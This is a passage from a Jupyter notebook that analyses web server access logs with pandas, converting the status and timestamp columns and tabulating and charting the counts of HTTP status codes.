      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "5174"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 45
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KZ3O4YeYKrPY",
        "outputId": "1bf115b7-4f0c-40c9-cab4-b5ae5ff86282"
      },
      "source": [
        "data.info()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "<class 'pandas.core.frame.DataFrame'>\n",
            "Int64Index: 5174 entries, 0 to 5182\n",
            "Data columns (total 7 columns):\n",
            " #   Column     Non-Null Count  Dtype  \n",
            "---  ------     --------------  -----  \n",
            " 0   ip         5174 non-null   object \n",
            " 1   timestamp  5174 non-null   object \n",
            " 2   timezone   5174 non-null   int64  \n",
            " 3   request    5174 non-null   object \n",
            " 4   slash      5174 non-null   object \n",
            " 5   http       5174 non-null   object \n",
            " 6   status     5174 non-null   float64\n",
            "dtypes: float64(1), int64(1), object(5)\n",
            "memory usage: 323.4+ KB\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CpYE53nZLTsh",
        "outputId": "0f5b8388-c841-4089-f930-303bf7fd881e"
      },
      "source": [
        "data['status']=data['status'].astype(int)\n",
        "data['status']"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0       200\n",
              "1       200\n",
              "2       200\n",
              "3       200\n",
              "4       200\n",
              "       ... \n",
              "5178    302\n",
              "5179    200\n",
              "5180    200\n",
              "5181    200\n",
              "5182    200\n",
              "Name: status, Length: 5174, dtype: int64"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 48
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "G9hH5gooNpht",
        "outputId": "379f85e1-d6d1-44e3-8298-f9f97639d47c"
      },
      "source": [
        "data['timestamp'] = pd.to_datetime(data['timestamp'],format='%d/%b/%Y:%H:%M:%S')\n",
        "data['timestamp']"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0      2021-03-19 14:27:44\n",
              "1      2021-03-19 14:27:44\n",
              "2      2021-03-19 14:27:44\n",
              "3      2021-03-19 14:27:45\n",
              "4      2021-03-19 14:27:45\n",
              "               ...        \n",
              "5178   2021-03-19 17:23:49\n",
              "5179   2021-03-19 17:23:49\n",
              "5180   2021-03-19 17:23:49\n",
              "5181   2021-03-19 17:24:17\n",
              "5182   2021-03-19 17:24:47\n",
              "Name: timestamp, Length: 5174, dtype: datetime64[ns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 52
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "uTvtppU5QaW1",
        "outputId": "72937f77-5724-46c4-bbf3-baf90a7c36b3"
      },
      "source": [
        "data.info()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "<class 'pandas.core.frame.DataFrame'>\n",
            "Int64Index: 5174 entries, 0 to 5182\n",
            "Data columns (total 7 columns):\n",
            " #   Column     Non-Null Count  Dtype         \n",
            "---  ------     --------------  -----         \n",
            " 0   ip         5174 non-null   object        \n",
            " 1   timestamp  5174 non-null   datetime64[ns]\n",
            " 2   timezone   5174 non-null   int64         \n",
            " 3   request    5174 non-null   object        \n",
            " 4   slash      5174 non-null   object        \n",
            " 5   http       5174 non-null   object        \n",
            " 6   status     5174 non-null   int64         \n",
            "dtypes: datetime64[ns](1), int64(2), object(4)\n",
            "memory usage: 323.4+ KB\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "AyKMRhDvQh11",
        "outputId": "19af98dc-4735-4e8f-be40-52809c3ecffa"
      },
      "source": [
        "data['status'].value_counts()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "200    3724\n",
              "404     534\n",
              "403     450\n",
              "302     243\n",
              "500     175\n",
              "499      42\n",
              "182       2\n",
              "400       2\n",
              "405       1\n",
              "301       1\n",
              "Name: status, dtype: int64"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 54
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 357
        },
        "id": "R3r5aEqeRMfh",
        "outputId": "96f9b7e0-9ebc-4ff5-a454-228978939c55"
      },
      "source": [
        "#concat-->concatenates pandas objects along a particular axis\n",
        "pd.concat([data['status'].value_counts().rename('Count'),\n",
        "          data['status'].value_counts(normalize=True).mul(100).rename(\"Percentage Status\")],axis=1)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Count</th>\n",
              "      <th>Percentage Status</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>200</th>\n",
              "      <td>3724</td>\n",
              "      <td>71.975261</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>404</th>\n",
              "      <td>534</td>\n",
              "      <td>10.320835</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>403</th>\n",
              "      <td>450</td>\n",
              "      <td>8.697333</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>302</th>\n",
              "      <td>243</td>\n",
              "      <td>4.696560</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>500</th>\n",
              "      <td>175</td>\n",
              "      <td>3.382296</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>499</th>\n",
              "      <td>42</td>\n",
              "      <td>0.811751</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>182</th>\n",
              "      <td>2</td>\n",
              "      <td>0.038655</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>400</th>\n",
              "      <td>2</td>\n",
              "      <td>0.038655</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>405</th>\n",
              "      <td>1</td>\n",
              "      <td>0.019327</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>301</th>\n",
              "      <td>1</td>\n",
              "      <td>0.019327</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "     Count  Percentage Status\n",
              "200   3724          71.975261\n",
              "404    534          10.320835\n",
              "403    450           8.697333\n",
              "302    243           4.696560\n",
              "500    175           3.382296\n",
              "499     42           0.811751\n",
              "182      2           0.038655\n",
              "400      2           0.038655\n",
              "405      1           0.019327\n",
              "301      1           0.019327"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 58
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 606
        },
        "id": "my-vAEgeTlwO",
        "outputId": "fafa8d52-6aeb-4241-fbc6-dd938c3b209f"
      },
      "source": [
        "data['status'].value_counts().plot.pie(figsize=(10,12))"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<matplotlib.axes._subplots.AxesSubplot at 0x7f05e0ea3fd0>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 60
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<Figure size 720x864 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4SEDeNitTlaH"
      },
      "source": [
        ""
      ]
    }
  ]
}